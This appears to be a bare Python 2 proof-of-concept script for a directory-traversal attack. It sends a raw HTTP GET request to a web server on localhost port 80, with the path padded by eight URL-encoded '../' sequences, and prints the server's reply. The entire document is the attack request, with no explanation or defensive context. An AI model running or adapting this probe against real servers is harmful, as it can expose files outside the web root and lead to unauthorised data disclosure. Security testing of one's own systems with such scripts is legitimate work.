import socket

host = 'localhost'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(8)
s.connect((host, port))
s.send('GET http://' + host + '/' + '..%2F' * 8 + ' HTTP/1.1\r\n'
       'Host: ' + host + '\r\n\r\n');

print s.recv(8192);

